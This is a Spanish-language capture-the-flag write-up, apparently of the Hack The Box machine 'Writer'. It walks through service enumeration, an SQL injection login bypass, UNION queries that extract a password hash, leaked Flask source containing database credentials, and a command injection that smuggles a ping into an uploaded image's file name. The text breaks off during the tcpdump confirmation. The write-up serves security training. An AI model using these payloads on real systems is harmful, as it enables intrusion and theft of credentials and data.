8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA) | 256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA) |_ 256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Story Bank | Writer.HTB 139/tcp open netbios-ssn Samba smbd 4.6.2 445/tcp open netbios-ssn Samba smbd 4.6.2 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: 17m35s |_nbstat: NetBIOS name: WRITER, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-08-10T22:24:47 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Aug 10 18:07:18 2021 -- 1 IP address (1 host up) scanned in 23.06 seconds SMB Utilizamos crackmapexec para obtener los recursos de SAMBA con una sesion nula, vemos el recurso writer2_project.\n1 2 3 4 5 6 7 8 9 π ~/htb/writer ❯ crackmapexec smb 10.10.11.101 -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.11.101 445 WRITER [*] Windows 6.1 Build 0 (name:WRITER) (domain:) (signing:False) (SMBv1:False) SMB 10.10.11.101 445 WRITER [+] \\: SMB 10.10.11.101 445 WRITER [+] Enumerated shares SMB 10.10.11.101 445 WRITER Share Permissions Remark SMB 10.10.11.101 445 WRITER ----- ----------- ------ SMB 10.10.11.101 445 WRITER print$ Printer Drivers SMB 10.10.11.101 445 WRITER writer2_project SMB 10.10.11.101 445 WRITER IPC$ IPC Service (writer server (Samba, Ubuntu)) RPC Utilizamos rpcclient para conectarnos con una sesion nula en el puerto RPC y poder enumerar usuarios, vemos unicamente a kyle.\n1 2 3 4 5 6 7 π ~/htb/writer ❯ rpcclient -U \u0026#34;\u0026#34; -N 10.10.11.101 rpcclient $\u0026gt; rpcclient $\u0026gt; enumdomusers user:[kyle] rid:[0x3e8] rpcclient $\u0026gt; querydispinfo index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: kyle Name: Kyle Travis Desc: rpcclient $\u0026gt; Web Site Al visitar la pagina vemos que se trata de un blog, donde vemos multiples posts.\nEn cada post vemos un nombre y apellido que podriamos utilizar como usuarios o contraseñas, además, en el footer encontramos un dominio (writer.htb) el cual agregamos a /etc/hosts.\nDirectory Brute Forcing Realizamos una busqueda de directorios y archivos utilizando feroxbuster.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 π ~/htb/writer ❯ feroxbuster -u http://writer.htb/ -w $MD -x php ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://writer.htb/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [php] 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 200 110l 347w 4905c http://writer.htb/contact 200 75l 320w 3522c http://writer.htb/about 301 9l 28w 309c http://writer.htb/static 301 9l 28w 314c http://writer.htb/static/blog 301 9l 28w 313c http://writer.htb/static/css 301 9l 28w 318c http://writer.htb/static/blog/css 301 9l 28w 312c http://writer.htb/static/js 301 9l 28w 317c http://writer.htb/static/blog/js 301 9l 28w 316c http://writer.htb/static/vendor 302 4l 24w 208c http://writer.htb/dashboard 301 9l 28w 314c http://writer.htb/static/font 200 35l 99w 1443c http://writer.htb/administrative 403 9l 28w 275c http://writer.htb/server-status SQL Injection Bypass Auth - Admin Encontramos en /administrative un login donde vemos un formulario.\nLogramos ingresar tras utilizar un payload en el parametro de usuario.\n1 admin\u0026#39; or 1=1 -- - El dashboard es una pagina estatica sin ningun tipo de funcionalidad o formulario.\nEn /stories vemos los posts que se muestran en el index que, además podemos editar y, agregar nuevos.\nTras editar un post y capturar la solicitud con burpsuite, vemos que se envia el parametro image_url vacio, ejecutamos netcat en el puerto 80 para ver que tipo de solicitud realiza.\nTras ingresar nuestra direccion IP vemos en el User Agent Python-urllib/3.8, probablemente el sitio web este escrito en python.\n1 2 3 4 5 6 7 8 π ~/htb/writer ❯ nc -lvp 80 listening on [any] 80 ... connect to [10.10.10.00] from writer.htb [10.10.11.101] 53926 GET /x.jpg HTTP/1.1 Accept-Encoding: identity Host: 10.10.10.10 User-Agent: Python-urllib/3.8 Connection: close El usuario admin es el unico usuario activo y registrado segun la informacion de /users.\nFinalmente /settings parece ser una pagina estatica ya que ningun formulario es enviado.\nSQLMap - Login Al no poder identificar otra vulnerabilidad dentro de las opciones del dashboard utilizamos SQLMap en el login donde se logró identificar que la base de datos es MySQL, mostró que aparentemente es vulnerable a SQL injection UNION con 6 columnas, sin embargo tras enumerar bases de datos o tablas, el proceso con sqlmap era demasiado lento.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 π ~/htb/writer ❯ sqlmap -r administrative.req --batch --dbs --level 5 --risk 3 ___ __H__ ___ ___[)]_____ ___ ___ {1.5.8#stable} |_ -| . [.] | .\u0026#39;| . | |___|_ [\u0026#39;]_|_|_|__,| _| |_|V... |_| http://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 14:05:44 /2021-09-15/ [14:05:44] [INFO] parsing HTTP request from \u0026#39;administrative.req\u0026#39; [.. snip ..] [14:06:02] [INFO] testing \u0026#39;MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP)\u0026#39; [14:06:12] [INFO] POST parameter \u0026#39;uname\u0026#39; appears to be \u0026#39;MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP)\u0026#39; injectable [14:06:12] [INFO] testing \u0026#39;Generic UNION query (NULL) - 1 to 20 columns\u0026#39; [14:06:12] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found [14:06:14] [INFO] target URL appears to be UNION injectable with 6 columns \u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;\u0026lt;=============================== injection not exploitable with NULL values. Do you want to try with a random integer value for option \u0026#39;--union-char\u0026#39;? [Y/n] Y [14:06:31] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. \u0026#39;--dbms=mysql\u0026#39;) [14:06:31] [INFO] testing \u0026#39;Generic UNION query (66) - 21 to 40 columns\u0026#39; [14:06:33] [INFO] testing \u0026#39;Generic UNION query (66) - 41 to 60 columns\u0026#39; [14:06:35] [INFO] testing \u0026#39;Generic UNION query (66) - 61 to 80 columns\u0026#39; [14:06:37] [INFO] testing \u0026#39;Generic UNION query (66) - 81 to 100 columns\u0026#39; [14:06:40] [INFO] testing \u0026#39;MySQL UNION query (66) - 1 to 20 columns\u0026#39; [14:06:57] [INFO] testing \u0026#39;MySQL UNION query (66) - 21 to 40 columns\u0026#39; [14:07:01] [INFO] testing \u0026#39;MySQL UNION query (66) - 41 to 60 columns\u0026#39; [14:07:03] [INFO] testing \u0026#39;MySQL UNION query (66) - 61 to 80 columns\u0026#39; [14:07:05] [INFO] testing \u0026#39;MySQL UNION query (66) - 81 to 100 columns\u0026#39; [14:07:07] [WARNING] in OR boolean-based injection cases, please consider usage of switch \u0026#39;--drop-set-cookie\u0026#39; if you experience any problems during data retrieval [14:07:07] [INFO] checking if the injection point on POST parameter \u0026#39;uname\u0026#39; is a false positive POST parameter \u0026#39;uname\u0026#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N sqlmap identified the following injection point(s) with a total of 409 HTTP(s) requests: --- Parameter: uname (POST) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause Payload: uname=-7032\u0026#39; OR 7670=7670-- RzJC\u0026amp;password=pass Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: uname=user\u0026#39; AND (SELECT 7890 FROM (SELECT(SLEEP(5)))sHvz)-- MhVu\u0026amp;password=pass --- [14:07:13] [INFO] the back-end DBMS is MySQL [14:07:14] [WARNING] reflective value(s) found and filtering out redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N web server operating system: Linux Ubuntu 19.10 or 20.04 (eoan or focal) web application technology: Apache 2.4.41 back-end DBMS: MySQL \u0026gt;= 5.0.12 (TiDB fork) [.. snip ..] SQL Injection Union Manualmente iniciamos buscando el numero de columnas con ORDER BY, utilizando repeater de burpsuite, logramos obtener una respuesta diferente luego de la columna 6, la misma cantidad que SQLMap mostró, y con ello encontramos que en la segunda columna existe la posiblidad de obtener datos.\nMediante distintos querys logramos obtener informacion: Bases de datos, Tablas, Columnas e informacion.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 # Version # \u0026#39; union select 1,@@version,3,4,5,6 -- - 10.3.29-MariaDB-0ubuntu0.20.04.1 # User # \u0026#39; union select 1,user(),3,4,5,6-- - admin@localhost # \u0026#39; union select 1,system_user(),3,4,5,6-- - admin@localhost # Bases de Datos # \u0026#39; union select 1,group_concat(schema_name SEPARATOR \u0026#39;, \u0026#39;),3,4,5,6 from information_schema.schemata-- - information_schema, writer # Tablas - Writer DB # \u0026#39; union select 1,group_concat(table_name SEPARATOR \u0026#39;, \u0026#39;),3,4,5,6 from information_schema.tables where table_type = \u0026#39;BASE TABLE\u0026#39;-- - site, stories, users # Columnas # -\u0026gt; users # \u0026#39; union select 1,group_concat(column_name SEPARATOR \u0026#39;, \u0026#39;),3,4,5,6 from information_schema.columns where table_name = \u0026#39;users\u0026#39;-- - id, username, password, email, status, date_created # -\u0026gt; stories id, author, title, tagline, content, status, date, image # -\u0026gt; site id, title, description, logo, favicon, ganalytics # users -\u0026gt; Data -\u0026gt; Cantidad de Filas # \u0026#39; union select 1,count(*),3,4,5,6 from users-- - 1 # users -\u0026gt; Data # \u0026#39; union select 1,group_concat(username,password,email),3,4,5,6 from users-- - admin 118e48794631a9612484ca8b55f622d0 admin@writer.htb En la Tabla users encontramos el hash de admin, pero no encontramos la contraseña en algun diccionario. Enumerando los privielgios vemos FILE para el usuario admin, lo que permite que el usuario lea y escriba archivos.\n1 2 3 # Privilegios # \u0026#39; union select 1,group_concat(privilege_type SEPARATOR \u0026#39;, \u0026#39;),3,4,5,6 FROM information_schema.user_privileges where grantee = \u0026#34;\u0026#39;admin\u0026#39;@\u0026#39;localhost\u0026#39;\u0026#34;-- - FILE Cargando el archivo /etc/passwd vemos el contenido completo.\nFiles Utilizamos un pequeño wordlist (omitiendo payloads codificados) con una lista de direcciones de archivos los cuales podrian darnos informacion, con Intruder de Burpsuite. Descubrimos la configuracion de apache.\nSe muestra el directorio y el archivo WSGI.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;VirtualHost *:80\u0026gt; ServerName writer.htb ServerAdmin admin@writer.htb WSGIScriptAlias / /var/www/writer.htb/writer.wsgi \u0026lt;Directory /var/www/writer.htb\u0026gt; Order allow,deny Allow from all \u0026lt;/Directory\u0026gt; Alias /static /var/www/writer.htb/writer/static \u0026lt;Directory /var/www/writer.htb/writer/static/\u0026gt; Order allow,deny Allow from all \u0026lt;/Directory\u0026gt; ErrorLog ${APACHE_LOG_DIR}/error.log LogLevel warn CustomLog ${APACHE_LOG_DIR}/access.log combined \u0026lt;/VirtualHost\u0026gt; [... REDACTED ...] WSGI importa el archivo __init__.py desde writer/ en /var/www/writer.htb/.\n1 2 3 4 5 6 7 8 9 10 11 12 13 #!/usr/bin/python import sys import logging import random import os # Define logging logging.basicConfig(stream=sys.stderr) sys.path.insert(0,\u0026#34;/var/www/writer.htb/\u0026#34;) # Import the __init__.py from the app folder from writer import app as application application.secret_key = os.environ.get(\u0026#34;SECRET_KEY\u0026#34;, \u0026#34;\u0026#34;) Tras obtener __init__.py, vemos el codigo fuente del sitio web, aparecen las credenciales de la conexion a la base de datos y las diferentes rutas.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 from flask import Flask, session, redirect, url_for, request, render_template from mysql.connector import errorcode import mysql.connector import urllib.request import os import PIL from PIL import Image, UnidentifiedImageError import hashlib app = Flask(__name__,static_url_path=\u0026#39;\u0026#39;,static_folder=\u0026#39;static\u0026#39;,template_folder=\u0026#39;templates\u0026#39;) #Define connection for database def connections(): try: connector = mysql.connector.connect(user=\u0026#39;admin\u0026#39;, password=\u0026#39;ToughPasswordToCrack\u0026#39;, host=\u0026#39;127.0.0.1\u0026#39;, database=\u0026#39;writer\u0026#39;) return connector except mysql.connector.Error as err: if err.errno == errorcode.ER_ACCESS_DENIED_ERROR: return (\u0026#34;Something is wrong with your db user name or password!\u0026#34;) elif err.errno == errorcode.ER_BAD_DB_ERROR: return (\u0026#34;Database does not exist\u0026#34;) else: return (\u0026#34;Another exception, returning!\u0026#34;) else: print (\u0026#39;Connection to DB is ready!\u0026#39;) #Define homepage @app.route(\u0026#39;/\u0026#39;) def home_page(): try: connector = connections() except mysql.connector.Error as err: return (\u0026#34;Database error\u0026#34;) cursor = connector.cursor() sql_command = \u0026#34;SELECT * FROM stories;\u0026#34; cursor.execute(sql_command) results = cursor.fetchall() return render_template(\u0026#39;blog/blog.html\u0026#39;, results=results) #Define about page @app.route(\u0026#39;/about\u0026#39;) def about(): return render_template(\u0026#39;blog/about.html\u0026#39;) #Define contact page @app.route(\u0026#39;/contact\u0026#39;) def contact(): return render_template(\u0026#39;blog/contact.html\u0026#39;) #Define blog posts @app.route(\u0026#39;/blog/post/\u0026lt;id\u0026gt;\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def blog_post(id): try: connector = connections() except mysql.connector.Error as err: return (\u0026#34;Database error\u0026#34;) cursor = connector.cursor() cursor.execute(\u0026#34;SELECT * FROM stories WHERE id = %(id)s;\u0026#34;, {\u0026#39;id\u0026#39;: id}) results = cursor.fetchall() sql_command = \u0026#34;SELECT * FROM stories;\u0026#34; cursor.execute(sql_command) stories = cursor.fetchall() return render_template(\u0026#39;blog/blog-single.html\u0026#39;, results=results, stories=stories) #Define dashboard for authenticated users @app.route(\u0026#39;/dashboard\u0026#39;) def dashboard(): if not (\u0026#39;user\u0026#39; in session): return redirect(\u0026#39;/\u0026#39;) return render_template(\u0026#39;dashboard.html\u0026#39;) #Define stories page for dashboard and edit/delete pages @app.route(\u0026#39;/dashboard/stories\u0026#39;) def stories(): if not (\u0026#39;user\u0026#39; in session): return redirect(\u0026#39;/\u0026#39;) try: connector = connections() except mysql.connector.Error as err: return (\u0026#34;Database error\u0026#34;) cursor = connector.cursor() sql_command = \u0026#34;Select * From stories;\u0026#34; cursor.execute(sql_command) results = cursor.fetchall() return render_template(\u0026#39;stories.html\u0026#39;, results=results) @app.route(\u0026#39;/dashboard/stories/add\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def add_story(): if not (\u0026#39;user\u0026#39; in session): return redirect(\u0026#39;/\u0026#39;) try: connector = connections() except mysql.connector.Error as err: return (\u0026#34;Database error\u0026#34;) if request.method == \u0026#34;POST\u0026#34;: if request.files[\u0026#39;image\u0026#39;]: image = request.files[\u0026#39;image\u0026#39;] if \u0026#34;.jpg\u0026#34; in image.filename: path = os.path.join(\u0026#39;/var/www/writer.htb/writer/static/img/\u0026#39;, image.filename) image.save(path) image = \u0026#34;/img/{}\u0026#34;.format(image.filename) else: error = \u0026#34;File extensions must be in .jpg!\u0026#34; return render_template(\u0026#39;add.html\u0026#39;, error=error) if request.form.get(\u0026#39;image_url\u0026#39;): image_url = request.form.get(\u0026#39;image_url\u0026#39;) if \u0026#34;.jpg\u0026#34; in image_url: try: local_filename, headers = urllib.request.urlretrieve(image_url) os.system(\u0026#34;mv {} {}.jpg\u0026#34;.format(local_filename, local_filename)) image = \u0026#34;{}.jpg\u0026#34;.format(local_filename) try: im = Image.open(image) im.verify() im.close() image = image.replace(\u0026#39;/tmp/\u0026#39;,\u0026#39;\u0026#39;) os.system(\u0026#34;mv /tmp/{} /var/www/writer.htb/writer/static/img/{}\u0026#34;.format(image, image)) image = \u0026#34;/img/{}\u0026#34;.format(image) except PIL.UnidentifiedImageError: os.system(\u0026#34;rm {}\u0026#34;.format(image)) error = \u0026#34;Not a valid image file!\u0026#34; return render_template(\u0026#39;add.html\u0026#39;, error=error) except: error = \u0026#34;Issue uploading picture\u0026#34; return render_template(\u0026#39;add.html\u0026#39;, error=error) else: error = \u0026#34;File extensions must be in .jpg!\u0026#34; return render_template(\u0026#39;add.html\u0026#39;, error=error) author = request.form.get(\u0026#39;author\u0026#39;) title = request.form.get(\u0026#39;title\u0026#39;) tagline = request.form.get(\u0026#39;tagline\u0026#39;) content = request.form.get(\u0026#39;content\u0026#39;) cursor = connector.cursor() cursor.execute(\u0026#34;INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,\u0026#39;Published\u0026#39;,now(),%(image)s);\u0026#34;, {\u0026#39;author\u0026#39;:author,\u0026#39;title\u0026#39;: title,\u0026#39;tagline\u0026#39;: tagline,\u0026#39;content\u0026#39;: content, \u0026#39;image\u0026#39;:image }) result = connector.commit() return redirect(\u0026#39;/dashboard/stories\u0026#39;) else: return render_template(\u0026#39;add.html\u0026#39;) @app.route(\u0026#39;/dashboard/stories/edit/\u0026lt;id\u0026gt;\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def edit_story(id): if not (\u0026#39;user\u0026#39; in session): return redirect(\u0026#39;/\u0026#39;) try: connector = connections() except mysql.connector.Error as err: return (\u0026#34;Database error\u0026#34;) if request.method == \u0026#34;POST\u0026#34;: cursor = connector.cursor() cursor.execute(\u0026#34;SELECT * FROM stories where id = %(id)s;\u0026#34;, {\u0026#39;id\u0026#39;: id}) results = cursor.fetchall() if request.files[\u0026#39;image\u0026#39;]: image = request.files[\u0026#39;image\u0026#39;] if \u0026#34;.jpg\u0026#34; in image.filename: path = os.path.join(\u0026#39;/var/www/writer.htb/writer/static/img/\u0026#39;, image.filename) image.save(path) image = \u0026#34;/img/{}\u0026#34;.format(image.filename) cursor = connector.cursor() cursor.execute(\u0026#34;UPDATE stories SET image = %(image)s WHERE id = %(id)s\u0026#34;, {\u0026#39;image\u0026#39;:image, \u0026#39;id\u0026#39;:id}) result = connector.commit() else: error = \u0026#34;File extensions must be in .jpg!\u0026#34; return render_template(\u0026#39;edit.html\u0026#39;, error=error, results=results, id=id) if request.form.get(\u0026#39;image_url\u0026#39;): image_url = request.form.get(\u0026#39;image_url\u0026#39;) if \u0026#34;.jpg\u0026#34; in image_url: try: local_filename, headers = urllib.request.urlretrieve(image_url) os.system(\u0026#34;mv {} {}.jpg\u0026#34;.format(local_filename, local_filename)) image = \u0026#34;{}.jpg\u0026#34;.format(local_filename) try: im = Image.open(image) im.verify() im.close() image = image.replace(\u0026#39;/tmp/\u0026#39;,\u0026#39;\u0026#39;) os.system(\u0026#34;mv /tmp/{} /var/www/writer.htb/writer/static/img/{}\u0026#34;.format(image, image)) image = \u0026#34;/img/{}\u0026#34;.format(image) cursor = connector.cursor() cursor.execute(\u0026#34;UPDATE stories SET image = %(image)s WHERE id = %(id)s\u0026#34;, {\u0026#39;image\u0026#39;:image, \u0026#39;id\u0026#39;:id}) result = connector.commit() except PIL.UnidentifiedImageError: os.system(\u0026#34;rm {}\u0026#34;.format(image)) error = \u0026#34;Not a valid image file!\u0026#34; return render_template(\u0026#39;edit.html\u0026#39;, error=error, results=results, id=id) except: error = \u0026#34;Issue uploading picture\u0026#34; return render_template(\u0026#39;edit.html\u0026#39;, error=error, results=results, id=id) else: error = \u0026#34;File extensions must be in .jpg!\u0026#34; return render_template(\u0026#39;edit.html\u0026#39;, error=error, results=results, id=id) title = request.form.get(\u0026#39;title\u0026#39;) tagline = request.form.get(\u0026#39;tagline\u0026#39;) content = request.form.get(\u0026#39;content\u0026#39;) cursor = connector.cursor() cursor.execute(\u0026#34;UPDATE stories SET title = %(title)s, tagline = %(tagline)s, content = %(content)s WHERE id = %(id)s\u0026#34;, {\u0026#39;title\u0026#39;:title, \u0026#39;tagline\u0026#39;:tagline, \u0026#39;content\u0026#39;:content, \u0026#39;id\u0026#39;: id}) result = connector.commit() return redirect(\u0026#39;/dashboard/stories\u0026#39;) else: cursor = connector.cursor() cursor.execute(\u0026#34;SELECT * FROM stories where id = %(id)s;\u0026#34;, {\u0026#39;id\u0026#39;: id}) results = cursor.fetchall() return render_template(\u0026#39;edit.html\u0026#39;, results=results, id=id) @app.route(\u0026#39;/dashboard/stories/delete/\u0026lt;id\u0026gt;\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def delete_story(id): if not (\u0026#39;user\u0026#39; in session): return redirect(\u0026#39;/\u0026#39;) try: connector = connections() except mysql.connector.Error as err: return (\u0026#34;Database error\u0026#34;) if request.method == \u0026#34;POST\u0026#34;: cursor = connector.cursor() cursor.execute(\u0026#34;DELETE FROM stories WHERE id = %(id)s;\u0026#34;, {\u0026#39;id\u0026#39;: id}) result = connector.commit() return redirect(\u0026#39;/dashboard/stories\u0026#39;) else: cursor = connector.cursor() cursor.execute(\u0026#34;SELECT * FROM stories where id = %(id)s;\u0026#34;, {\u0026#39;id\u0026#39;: id}) results = cursor.fetchall() return render_template(\u0026#39;delete.html\u0026#39;, results=results, id=id) #Define user page for dashboard @app.route(\u0026#39;/dashboard/users\u0026#39;) def users(): if not (\u0026#39;user\u0026#39; in session): return redirect(\u0026#39;/\u0026#39;) try: connector = connections() except mysql.connector.Error as err: return \u0026#34;Database Error\u0026#34; cursor = connector.cursor() sql_command = \u0026#34;SELECT * FROM users;\u0026#34; cursor.execute(sql_command) results = cursor.fetchall() return render_template(\u0026#39;users.html\u0026#39;, results=results) #Define settings page @app.route(\u0026#39;/dashboard/settings\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def settings(): if not (\u0026#39;user\u0026#39; in session): return redirect(\u0026#39;/\u0026#39;) try: connector = connections() except mysql.connector.Error as err: return \u0026#34;Database Error!\u0026#34; cursor = connector.cursor() sql_command = \u0026#34;SELECT * FROM site WHERE id = 1\u0026#34; cursor.execute(sql_command) results = cursor.fetchall() return render_template(\u0026#39;settings.html\u0026#39;, results=results) #Define authentication mechanism @app.route(\u0026#39;/administrative\u0026#39;, methods=[\u0026#39;POST\u0026#39;, \u0026#39;GET\u0026#39;]) def login_page(): if (\u0026#39;user\u0026#39; in session): return redirect(\u0026#39;/dashboard\u0026#39;) if request.method == \u0026#34;POST\u0026#34;: username = request.form.get(\u0026#39;uname\u0026#39;) password = request.form.get(\u0026#39;password\u0026#39;) password = hashlib.md5(password.encode(\u0026#39;utf-8\u0026#39;)).hexdigest() try: connector = connections() except mysql.connector.Error as err: return (\u0026#34;Database error\u0026#34;) try: cursor = connector.cursor() sql_command = \u0026#34;Select * From users Where username = \u0026#39;%s\u0026#39; And password = \u0026#39;%s\u0026#39;\u0026#34; % (username, password) cursor.execute(sql_command) results = cursor.fetchall() for result in results: print(\u0026#34;Got result\u0026#34;) if result and len(result) != 0: session[\u0026#39;user\u0026#39;] = username return render_template(\u0026#39;success.html\u0026#39;, results=results) else: error = \u0026#34;Incorrect credentials supplied\u0026#34; return render_template(\u0026#39;login.html\u0026#39;, error=error) except: error = \u0026#34;Incorrect credentials supplied\u0026#34; return render_template(\u0026#39;login.html\u0026#39;, error=error) else: return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#34;/logout\u0026#34;) def logout(): if not (\u0026#39;user\u0026#39; in session): return redirect(\u0026#39;/\u0026#39;) session.pop(\u0026#39;user\u0026#39;) return redirect(\u0026#39;/\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39;: app.run(\u0026#34;0.0.0.0\u0026#34;) Command Injection En Bypass Auth - Admin encontramos en los headers la version de Urllib (Python-urllib/3.8), en el codigo fuente vemos que utiliza la funcion urlretrieve() para descargar una imagen desde una url en este caso el valor image_url (valor que era enviado vacio), seguidamente vemos que se ejecuta un comando del sistema para cambiar el nombre al archivo utilizando mv donde podriamos injectar codigo ya que toma el nombre completo del archivo, tambien, al mover la imagen al directorio de imagenes (img/) vuelve a cambiar el nombre por lo que tambien volvería a ejecutar un comando si el nombre del archivo contiene uno (comando).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 [... REDACTED ...] if request.form.get(\u0026#39;image_url\u0026#39;): image_url = request.form.get(\u0026#39;image_url\u0026#39;) if \u0026#34;.jpg\u0026#34; in image_url: try: local_filename, headers = urllib.request.urlretrieve(image_url) os.system(\u0026#34;mv {} {}.jpg\u0026#34;.format(local_filename, local_filename)) image = \u0026#34;{}.jpg\u0026#34;.format(local_filename) try: im = Image.open(image) im.verify() im.close() image = image.replace(\u0026#39;/tmp/\u0026#39;,\u0026#39;\u0026#39;) os.system(\u0026#34;mv /tmp/{} /var/www/writer.htb/writer/static/img/{}\u0026#34;.format(image, image)) image = \u0026#34;/img/{}\u0026#34;.format(image) cursor = connector.cursor() cursor.execute(\u0026#34;UPDATE stories SET image = %(image)s WHERE id = %(id)s\u0026#34;, {\u0026#39;image\u0026#39;:image, \u0026#39;id\u0026#39;:id}) result = connector.commit() [... REDACTED ...] Sin embargo al enviar una imagen dentro de la maquina se crea un archivo temporal con un nombre aleatorio (/tmp/tmpxxxxxxx) por lo que enviar una imagen como URL http no funciona. En la documentacion de urllib - 3.8 menciona:\nSi la URL apunta a un archivo local, el objeto no será copiado a no ser que sea suministrado un nombre de archivo.\nEs decir si se pasa como parametro file:///path/to/img.jpg no creará un archivo temporal como lo hace con una url, si no directamente pasaría a cambiar el nombre del archivo. Para ello vemos que al subir una imagen cuando se edita un post (/dashboard/stories/edit/) se guarda en el directorio de imagenes sin ningun cambio al nombre del archivo, además, el directorio completo se muestra en el codigo.\n1 2 3 4 5 6 7 8 9 10 11 12 [... REDACTED ...] if request.files[\u0026#39;image\u0026#39;]: image = request.files[\u0026#39;image\u0026#39;] if \u0026#34;.jpg\u0026#34; in image.filename: path = os.path.join(\u0026#39;/var/www/writer.htb/writer/static/img/\u0026#39;, image.filename) image.save(path) image = \u0026#34;/img/{}\u0026#34;.format(image.filename) cursor = connector.cursor() cursor.execute(\u0026#34;UPDATE stories SET image = %(image)s WHERE id = %(id)s\u0026#34;, {\u0026#39;image\u0026#39;:image, \u0026#39;id\u0026#39;:id}) result = connector.commit() [... REDACTED ...] Simple Ping Con esto ultimo seguimos algunos pasos para inyectar comandos:\nCambiar el nombre de una imagen ingresando un comando: img.jpg;ping -c 3 10.10.10.10; Subir la imagen en la edicion de una storie (/dashboard/stories/edit/) y confirmamos que la imagen fue subida.\nEnviar el path completo del archivo localmente (file:///path/to/img.jpg) en la edicion de stories.\nFinalmente debería de ejecutarse el comando, en este caso tendríamos un ping a nuestra maquina, tal y como se muestra a continuación. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 π ~/htb/writer ❯ sudo tcpdump -i tun0 icmp [sudo] password for kali: tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 13:40:48.807916 IP writer.htb \u0026gt; 10.10.10.10: ICMP echo request, id 3, seq 1, length 64 13:40:48.807941 IP 10.10.10.10 \u0026gt; writer.htb: ICMP echo reply, id 3, seq 1, length 64 13:40:49.837626 IP writer.htb \u0026gt; 10.10.10.10: ICMP echo request, id 